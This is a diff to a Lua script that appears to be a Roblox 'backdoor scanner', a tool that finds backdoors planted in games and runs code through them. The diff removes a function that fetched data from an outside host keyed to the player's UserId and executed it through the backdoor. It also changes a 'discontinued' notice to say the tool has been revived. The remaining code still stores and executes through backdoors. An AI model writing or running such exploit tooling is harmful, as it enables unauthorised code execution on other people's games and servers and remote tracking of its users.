@@ -443,15 +443,6 @@ local function resetExecutionState()
     ui.title.Text = TITLE;
 end;
 
-local function logGame()
-    local int, data = pcall(game.HttpGet, game, "https://k4scripts.xyz/bexe/token/" .. localPlayer.UserId);
-    if not int then
-        return;
-    end
-    execute(applyMacros(LOG_GAME):format(data), backdoor, false, true):Wait();
-end;
-
-
 btns.execBtn.MouseButton1Click:Connect(function()
     -- avoid multiple executions
     if executing then
@@ -478,8 +469,6 @@ btns.execBtn.MouseButton1Click:Connect(function()
         -- store game
         games.loadGame(game.PlaceId, encodeBackdoors({backdoor}));
         config.save();
-        -- log game
-        logGame();
         firstExecution = false;
     end;
     -- execute
@@ -493,4 +482,4 @@ ui.title.Text = TITLE;
 
 alertLib.Success(screenGui, TITLE, 'Backdoor scanner successfully loaded.');
 alertLib.Info(screenGui, TITLE, 'Home to toggle ui.', 4);
-alertLib.Info(screenGui, TITLE, 'THIS HAS BEEN DISCONTINUED', 4);
+alertLib.Info(screenGui, TITLE, 'This has been recontinued by ReactorCoreDev', 4);
